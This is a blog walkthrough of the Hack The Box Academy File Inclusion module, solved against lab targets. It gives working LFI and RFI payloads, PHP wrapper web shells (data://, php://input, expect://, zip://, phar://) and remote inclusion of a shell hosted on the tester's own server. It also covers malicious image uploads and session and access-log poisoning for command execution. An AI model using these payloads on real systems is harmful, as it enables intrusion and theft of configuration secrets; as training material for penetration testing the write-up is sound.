---
layout: post
title:  "Hack The Box - Academy - File Inclusion"
description: "Explore this detailed walkthrough of Hack The Box Academy's File Inclusion module. Learn effective techniques to perform Local file inclusion (LFI), Remote File Inclusion (RFI) and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-12-15 16:28
image:  /images/htb/file-inclusion/logo.png
tags:   [lfi,rfi,cbbh]
categories: [htbacademy]
---

## Explore this detailed walkthrough of Hack The Box Academy's File Inclusion module. Learn effective techniques to perform Local file inclusion (LFI), Remote File Inclusion (RFI)

>
<b>References:</b>
<br/>
<a href="https://academy.hackthebox.com/module/23/section/250">HTB - File Inclusion</a><br/>
<a href="https://jacozwarts.github.io/images/htb/file-inclusion/File_Inclusion_Module_Cheat_Sheet.pdf">HTB - File Inclusion - Cheat Sheet</a><br/>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md">PayLoadsAllTheThings - File inclusion</a><br/>
<a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">HackTricks - File inclusion</a><br/>


## Basic Bypasses - Exercise
> The web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

### Set Up the LFI Wordlist
```
sudo apt install seclists
```

We’ll use the `LFI-Jhaddix.txt` wordlist, found at:
```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

This list includes paths that can reveal LFI vulnerabilities in web applications.

### Send the Request to Caido Automate

Mark the Payload Position: Send the request to Caido’s Automate tool and highlight the `es.php` part of the path as the payload position.

### Configure Payload Settings
Open the `Payload Tab`: Click on the `Payload` tab on the right side of the Automate interface.
Choose Payload Type: Select `Simple List` as the payload type.
Load the LFI Wordlist: Point to the `LFI-Jhaddix.txt` path in your system, and load it as the payload list.

![Caido - LFI Automate](/images/htb/file-inclusion/basic-bypass-exercise-caido-automate.png)

### Adjust Preprocessors
Disable URL Encoding: Go to the `Preprocessors` tab and remove the `URL Encode` option. This ensures our payloads are sent exactly as they appear in the wordlist, which is essential for LFI testing.

### Increase Worker Count
Optimize Worker Settings: In the settings section, increase the number of workers to speed up the testing process by sending multiple requests in parallel.

### Filter Results by Response Length
After Caido completes sending requests:

Apply a `Length Filter`: Look through the responses for any with a length of `3833`, as this indicates a file or directory was successfully accessed, pointing to a potential LFI vulnerability.

![Caido - LFI Automate Result](/images/htb/file-inclusion/basic-bypass-exercise-caido-result.png)

## PHP Filters - Exercise
> Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

We'll use the `directory-list-2.3-small.txt` wordlist from the SecLists to perform web content discovery.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
![Ffuf - Content Discovery](/images/htb/file-inclusion/php-filters-ffuf-result.png)

After identifying the PHP file, we'll use the php://filter stream wrapper to encode the file's content in Base64 format. Replace {PHP_PAGE} with the name of the discovered PHP file:

```
php://filter/read=convert.base64-encode/resource={PHP_PAGE}
```

![PHP Filter Extract Source Code](/images/htb/file-inclusion/php-filters-base64-result.png)

We'll use Caido's built in Base-64 decode tool to decode the payload and read the database password.

![Extract database password](/images/htb/file-inclusion/php-filter-result.png)

## PHP Wrappers - Exercise

> Try to gain RCE using one of the PHP wrappers and read the flag at /

We'll read the php.ini file to check if `allow_url_include` is enable for us to use the [php data wrapper](https://www.php.net/manual/en/wrappers.data.php)

We'll use the below payload to read the `php.ini` file:

```
php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini
```

For `Nginx`:

```
php://filter/read=convert.base64-encode/resource=../../../..//etc/php/X.Y/fpm/php.ini
```

Different php wrappers to use:


- data:// (GET)

```
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

![Data php warpper](/images/htb/file-inclusion/php-wrappers-data.png)
- php://input (POST)

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

![Input php warpper](/images/htb/file-inclusion/php-wrappers-input.png)
- expect:// (GET)

```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)

> Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

### HTTP

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```
sudo python3 -m http.server <LISTENING_PORT>
```

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

![RFI HTTP Result](/images/htb/file-inclusion/rfi-http-result.png)

### FTP

```
sudo python -m pyftpdlib -p 21
```

I ran into the following issue when trying to use pyftdlib: `/usr/bin/python: No module named pyftpdlib`

```
sudo apt-get install python3-pyftpdlib
```

![RFI FTP Result](/images/htb/file-inclusion/rfi-ftp-result.png)

### SMB

```
impacket-smbserver -smb2support share $(pwd)
```

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

## LFI and File Uploads

> Use any of the techniques covered in this section to gain RCE and read the flag at /

### Image Upload:

Create a malicious image containing a PHP web shell code:

```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Upload the malicious GIF file through the profile picture upload feature. After the upload is successful, navigate to the main page and apply the local file inclusion techniques covered in previous modules to execute the malicious shell.gif file.

```
http://{TARGET_IP}{TARGET_PORT}/index.php?language=./profile_images/shell.gif&cmd=id
```

### Zip Upload

Create malicious zip file and use php zip wrapper to access the RCE.

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```
http://{TARGET_IP}{TARGET_PORT}/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload

Create a new php file with below script:

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile the script into a phar file and rename it to shell.jpg as follows:

```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```
http://{TARGET_IP}{TARGET_PORT}/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```


### Log Poisoning

PHP session files on the back-end, and saved in `/var/lib/php/sessions/` on `Linux` and in `C:\Windows\Temp\` on `Windows`.

#### Testing for log Poisoning.
Extract your `PHPSESSID` from your browser's stored cookies, you can also use the CookieEditor browser extension:

![Cookie Editor](/images/htb/file-inclusion/log-poisoning-show-phpsessid-cookie.png)

Read session file:
```
http://{TARGET_IP}:{TARGET_PORT}/index.php?language=/var/lib/php/sessions/sess_g5ds0eji4klqpmn82iid4gmsrm
```
![Read PHPSESSID File](/images/htb/file-inclusion/log-poisoning-read-phpsessid.png)

The payload below will write the malicious code to the log file.

```
http://{TARGET_IP}:{TARGET_PORT}/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Read the log file to execute the malicious code:
```
http://{TARGET_IP}:{TARGET_PORT}/index.php?language=/var/lib/php/sessions/sess_g5ds0eji4klqpmn82iid4gmsrm&cmd=id
```

### Server Log Poisoning

By default, `Apache logs` are located in `/var/log/apache2/` on `Linux` and in `C:\xampp\apache\logs\` on `Windows`, while `Nginx logs` are located in `/var/log/nginx/` on `Linux` and in `C:\nginx\log\` on `Windows`.

```
http://{TARGET_IP}:{TARGET_PORT}/index.php?language=/var/log/apache2/access.log
```

Intercept the request with Caido and add the malicious payload in the User Agent header:

```
<?php system($_GET['cmd']); ?>
```

```
curl -s "http://{TARGET_IP}:{TARGET_PORT}/index.php" -A "<?php system($_GET['cmd']); ?>"
```


## Automated Scanning

### First we'll use ffuf with seclists `burp-parameter-names` wordlist.

```
 ffuf -w /usr/share//seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2309
```

![Paramter Recon](/images/htb/file-inclusion/automation-parameter-recon.png)

### Using Caido with LFI-Jhaddix wordlist:

![Caido Automation with LFI-Jhaddix](/images/htb/file-inclusion/automation-caido-lfi-jhadix.png)

![Caido Automation with LFI-Jhaddix Result](/images/htb/file-inclusion/automation-caido-lfi-jhadix-result.png)

![Caido Automation flag Result](/images/htb/file-inclusion/automation-flag-result.png)

## Skills Assessment

><b>Overview:</b>
The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.<br/><br/>
They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.<br/><br/>
Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.<br/><br/>
`Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.`<br/><br/>

I began my assessment of the INLANEFREIGHT web application by identifying the following pages:

- http://94.237.50.250:37554/index.php?page=
- http://94.237.50.250:37554/index.php?message=
- http://94.237.50.250:37554/booking.html

I tested the page and message parameters of index.php for potential Local File Inclusion (LFI) vulnerabilities using the `LFI-JHaddix` wordlist. Unfortunately, no LFI vulnerabilities were identified during this testing phase.

Next, I attempted to leverage `PHP filters` on the page parameter of index.php to read the source code of the file. This technique often proves useful when standard LFI attempts fail, as PHP filters can provide additional insights into the server-side code.


```
/index.php?page=php://filter/read=convert.base64-encode/resource=index 
```

![Caido - PHP Filter](/images/htb/file-inclusion/skills-assessment-phpfilter-result.png)

![Index Source Code](/images/htb/file-inclusion/skills-assessment-index-source-code.png)

We'll use the LFI-JHaddix wordlist to test the admin portal's paramters:

![Caido - Testing LFI Vulnerability](/images/htb/file-inclusion/skills-assessment-admin-portal-lfi-vulnerability.png)


Next we'll use the log file poising technique to read the flag's content.

```
?log=../../../../../../var/log/nginx/access.log
```

We'll use the User Agent to extract the flag:

![Use Agent in Log Files](/images/htb/file-inclusion/skills-assessment-log-file-poisoning.png)


```
<?php system($_GET['cmd']) ?>
```

```
?log=../../../../../../var/log/nginx/access.log&cmd=pwd
```

To get the actual result you'll have to send the malicious payload a few times:

![Log Poisoning Result](/images/htb/file-inclusion/skills-assesment-log-poisoning-result.png)


![Skills Assessment Flag File](/images/htb/file-inclusion/skills-assessment-flag-file.png)


![Skills Assessment Result](/images/htb/file-inclusion/skills-assessment-result.png)

<hr/>